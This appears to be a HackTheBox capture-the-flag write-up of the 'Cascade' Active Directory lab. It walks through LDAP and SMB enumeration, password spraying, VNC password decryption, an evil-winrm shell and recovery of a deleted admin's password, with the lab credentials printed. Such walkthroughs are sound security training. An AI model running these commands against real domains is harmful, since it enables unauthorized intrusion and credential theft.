---
title: HackTheBox-Cascade
date: 2024-12-24 09:40:00 +/-TTTT
categories: [boxes, red-teaming]
tags: [ldapsearch, VNC, AD-Recycle-Bin]     # TAG names should always be lowercase
---

## SMB-enum

    ➜  cascade nxc smb 10.10.10.182 -u '' -p '' --shares
    SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:Fals

## ldapsearch

    ➜  cascade ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.182 > ldap_resul.txt

    ➜  cascade cat ldap_resul.txt | grep "Pwd"
    maxPwdAge: -9223372036854775808
    minPwdAge: 0
    minPwdLength: 5
    badPwdCount: 0
    maxPwdAge: -37108517437440
    minPwdAge: 0
    minPwdLength: 0
    badPwdCount: 0
    badPwdCount: 0
    badPwdCount: 0
    badPwdCount: 0
    cascadeLegacyPwd: clk0bjVldmE=

### grab pass

    ➜  cascade echo -n "clk0bjVldmE=" | base64 -d
    rY4n5eva

## password-spray

    ➜  cascade nxc smb 10.10.10.182 -u users.txt -p 'rY4n5eva' --shares
    SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
    SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:rY4n5eva STATUS_LOGON_FAILURE
    SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:rY4n5eva STATUS_LOGON_FAILURE
    SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\s.smith:rY4n5eva STATUS_LOGON_FAILURE
    SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
    SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares
    SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
    SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
    SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
    SMB         10.10.10.182    445    CASC-DC1         Audit$                          
    SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
    SMB         10.10.10.182    445    CASC-DC1         Data            READ            
    SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
    SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share                                                                                      
    SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers                                                                                         
    SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

## grab-all-files

    ➜  cascade smbclient \\\\cascade.local\\Data -U r.thompson
    Password for [WORKGROUP\r.thompson]:
    Try "help" to get a list of possible commands.
    smb: \> mask ""
    smb: \> recurse ON
    smb: \> prompt OFF
    smb: \> mget *
    NT_STATUS_ACCESS_DENIED listing \Contractors\*
    NT_STATUS_ACCESS_DENIED listing \Finance\*
    NT_STATUS_ACCESS_DENIED listing \Production\*
    NT_STATUS_ACCESS_DENIED listing \Temps\*
    getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
    getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (1.4 KiloBytes/sec) (average 2.1 KiloBytes/sec)
    getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.1 KiloBytes/sec) (average 3.7 KiloBytes/sec)
    getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (3.2 KiloBytes/sec) (average 3.6 KiloBytes/sec)

### file-enum

    We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). 

## VNC-pwd

    ➜  s.smith cat VNC\ Install.reg 
    ��Windows Registry Editor Version 5.00
    [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]
    [HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
    "EnableUrlParams"=dword:00000001
    "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
    "AlwaysShared"=dword:00000000
    "VideoRects"=""

    "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

    6bcf2a4b6e5aca0f

[VNCPASSWD](https://github.com/jeroennijhof/vncpwd)

    ➜  vncpwd git:(master) ✗ echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass

    ➜  vncpwd git:(master) ✗ ./vncpwd vnc_enc_pass 
    Password: sT333ve2

### winrm-shell

    ➜  cascade evil-winrm -i 10.10.10.182 -u s.smith -p 'sT333ve2'         
                                            
    Evil-WinRM shell v3.7
                                            
    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                     
                                            
    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                       
                                            
    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\s.smith\Documents> 


    \Casc-DC1\Audit$ -> Shares

    ArkSvc : 'w3lc0meFr31nd'

    *Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
    User name                    arksvc
    Full Name                    ArkSvc
    Comment
    User's comment
    Country code                 000 (System Default)
    Account active               Yes
    Account expires              Never

    Password last set            1/9/2020 4:18:20 PM
    Password expires             Never
    Password changeable          1/9/2020 4:18:20 PM
    Password required            Yes
    User may change password     No

    Workstations allowed         All
    Logon script
    User profile
    Home directory
    Last logon                   12/23/2024 1:03:33 PM

    Logon hours allowed          All

    Local Group Memberships      *AD Recycle Bin       *IT

    AD Recycle Bin

## AD Recycle Bin

    Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *


    *Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *


    accountExpires                  : 9223372036854775807
    badPasswordTime                 : 0
    badPwdCount                     : 0
    CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
                                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
    CN                              : CASC-WS1
                                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
    codePage                        : 0
    countryCode                     : 0
    Created                         : 1/9/2020 7:30:19 PM
    createTimeStamp                 : 1/9/2020 7:30:19 PM
    Deleted                         : True
    Description                     :
    DisplayName                     :
    DistinguishedName               : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
    dSCorePropagationData           : {1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM, 1/9/2020 7:30:19 PM, 1/1/1601 12:04:17 AM}
    instanceType                    : 4
    isCriticalSystemObject          : False
    isDeleted                       : True
    LastKnownParent                 : OU=Computers,OU=UK,DC=cascade,DC=local
    lastLogoff                      : 0
    lastLogon                       : 0
    localPolicyFlags                : 0
    logonCount                      : 0
    Modified                        : 1/28/2020 6:08:35 PM
    modifyTimeStamp                 : 1/28/2020 6:08:35 PM
    msDS-LastKnownRDN               : CASC-WS1
    Name                            : CASC-WS1
                                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
    nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
    ObjectCategory                  :
    ObjectClass                     : computer
    ObjectGUID                      : 6d97daa4-2e82-4946-a11e-f91fa18bfabe
    objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1108
    primaryGroupID                  : 515
    ProtectedFromAccidentalDeletion : False
    pwdLastSet                      : 132230718192147073
    sAMAccountName                  : CASC-WS1$
    sDRightsEffective               : 0
    userAccountControl              : 4128
    uSNChanged                      : 245849
    uSNCreated                      : 24603
    whenChanged                     : 1/28/2020 6:08:35 PM
    whenCreated                     : 1/9/2020 7:30:19 PM

    CanonicalName                   : cascade.local/Deleted Objects/Scheduled Tasks
                                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
    CN                              : Scheduled Tasks
                                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
    Created                         : 1/13/2020 5:21:53 PM
    createTimeStamp                 : 1/13/2020 5:21:53 PM
    Deleted                         : True
    Description                     :
    DisplayName                     :
    DistinguishedName               : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local
    dSCorePropagationData           : {1/17/2020 9:35:46 PM, 1/17/2020 9:32:57 PM, 1/17/2020 3:37:36 AM, 1/17/2020 12:14:04 AM...}
    groupType                       : -2147483644
    instanceType                    : 4
    isDeleted                       : True
    LastKnownParent                 : OU=Groups,OU=UK,DC=cascade,DC=local
    Modified                        : 1/28/2020 6:07:55 PM
    modifyTimeStamp                 : 1/28/2020 6:07:55 PM
    msDS-LastKnownRDN               : Scheduled Tasks
    Name                            : Scheduled Tasks
                                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
    nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
    ObjectCategory                  :
    ObjectClass                     : group
    ObjectGUID                      : 13375728-5ddb-4137-b8b8-b9041d1d3fd2
    objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1131
    ProtectedFromAccidentalDeletion : False
    sAMAccountName                  : Scheduled Tasks
    sDRightsEffective               : 0
    uSNChanged                      : 245848
    uSNCreated                      : 114790
    whenChanged                     : 1/28/2020 6:07:55 PM
    whenCreated                     : 1/13/2020 5:21:53 PM

    CanonicalName                   : cascade.local/Deleted Objects/{A403B701-A528-4685-A816-FDEE32BDDCBA}
                                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
    CN                              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
    Created                         : 1/26/2020 2:34:30 AM
    createTimeStamp                 : 1/26/2020 2:34:30 AM
    Deleted                         : True
    Description                     :
    DisplayName                     : Block Potato
    DistinguishedName               : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
    dSCorePropagationData           : {1/1/1601 12:00:00 AM}
    flags                           : 0
    gPCFileSysPath                  : \\cascade.local\SysVol\cascade.local\Policies\{A403B701-A528-4685-A816-FDEE32BDDCBA}
    gPCFunctionalityVersion         : 2
    gPCMachineExtensionNames        : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1D-2488-11D1-A28C-00C04FB94F17}]
    instanceType                    : 4
    isDeleted                       : True
    LastKnownParent                 : CN=Policies,CN=System,DC=cascade,DC=local
    Modified                        : 1/26/2020 2:40:52 AM
    modifyTimeStamp                 : 1/26/2020 2:40:52 AM
    msDS-LastKnownRDN               : {A403B701-A528-4685-A816-FDEE32BDDCBA}
    Name                            : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
    nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
    ObjectCategory                  :
    ObjectClass                     : groupPolicyContainer
    ObjectGUID                      : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
    ProtectedFromAccidentalDeletion : False
    sDRightsEffective               : 0
    showInAdvancedViewOnly          : True
    uSNChanged                      : 196701
    uSNCreated                      : 196688
    versionNumber                   : 2
    whenChanged                     : 1/26/2020 2:40:52 AM
    whenCreated                     : 1/26/2020 2:34:30 AM

    CanonicalName                   : cascade.local/Deleted Objects/Machine
                                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
    CN                              : Machine
                                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
    Created                         : 1/26/2020 2:34:31 AM
    createTimeStamp                 : 1/26/2020 2:34:31 AM
    Deleted                         : True
    Description                     :
    DisplayName                     :
    DistinguishedName               : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
    dSCorePropagationData           : {1/1/1601 12:00:00 AM}
    instanceType                    : 4
    isDeleted                       : True
    LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
    Modified                        : 1/26/2020 2:40:52 AM
    modifyTimeStamp                 : 1/26/2020 2:40:52 AM
    msDS-LastKnownRDN               : Machine
    Name                            : Machine
                                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
    nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
    ObjectCategory                  :
    ObjectClass                     : container
    ObjectGUID                      : 93c23674-e411-400b-bb9f-c0340bda5a34
    ProtectedFromAccidentalDeletion : False
    sDRightsEffective               : 0
    showInAdvancedViewOnly          : True
    uSNChanged                      : 196699
    uSNCreated                      : 196689
    whenChanged                     : 1/26/2020 2:40:52 AM
    whenCreated                     : 1/26/2020 2:34:31 AM

    CanonicalName                   : cascade.local/Deleted Objects/User
                                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
    CN                              : User
                                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
    Created                         : 1/26/2020 2:34:31 AM
    createTimeStamp                 : 1/26/2020 2:34:31 AM
    Deleted                         : True
    Description                     :
    DisplayName                     :
    DistinguishedName               : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local
    dSCorePropagationData           : {1/1/1601 12:00:00 AM}
    instanceType                    : 4
    isDeleted                       : True
    LastKnownParent                 : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
    Modified                        : 1/26/2020 2:40:52 AM
    modifyTimeStamp                 : 1/26/2020 2:40:52 AM
    msDS-LastKnownRDN               : User
    Name                            : User
                                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
    nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
    ObjectCategory                  :
    ObjectClass                     : container
    ObjectGUID                      : 746385f2-e3a0-4252-b83a-5a206da0ed88
    ProtectedFromAccidentalDeletion : False
    sDRightsEffective               : 0
    showInAdvancedViewOnly          : True
    uSNChanged                      : 196700
    uSNCreated                      : 196690
    whenChanged                     : 1/26/2020 2:40:52 AM
    whenCreated                     : 1/26/2020 2:34:31 AM

    accountExpires                  : 9223372036854775807
    badPasswordTime                 : 0
    badPwdCount                     : 0
    CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
    cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
    CN                              : TempAdmin
                                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
    codePage                        : 0
    countryCode                     : 0
    Created                         : 1/27/2020 3:23:08 AM
    createTimeStamp                 : 1/27/2020 3:23:08 AM
    Deleted                         : True
    Description                     :
    DisplayName                     : TempAdmin
    DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
    dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
    givenName                       : TempAdmin
    instanceType                    : 4
    isDeleted                       : True
    LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
    lastLogoff                      : 0
    lastLogon                       : 0
    logonCount                      : 0
    Modified                        : 1/27/2020 3:24:34 AM
    modifyTimeStamp                 : 1/27/2020 3:24:34 AM
    msDS-LastKnownRDN               : TempAdmin
    Name                            : TempAdmin
                                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
    nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
    ObjectCategory                  :
    ObjectClass                     : user
    ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
    objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
    primaryGroupID                  : 513
    ProtectedFromAccidentalDeletion : False
    pwdLastSet                      : 132245689883479503
    sAMAccountName                  : TempAdmin
    sDRightsEffective               : 0
    userAccountControl              : 66048
    userPrincipalName               : TempAdmin@cascade.local
    uSNChanged                      : 237705
    uSNCreated                      : 237695
    whenChanged                     : 1/27/2020 3:24:34 AM
    whenCreated                     : 1/27/2020 3:23:08 AM

### grab pass

    ➜  cascade echo -n "YmFDVDNyMWFOMDBkbGVz" | base64 -d
    baCT3r1aN00dles

Video Walwalkthrough
[WATCH!](https://youtu.be/5LkkxZMvrNo)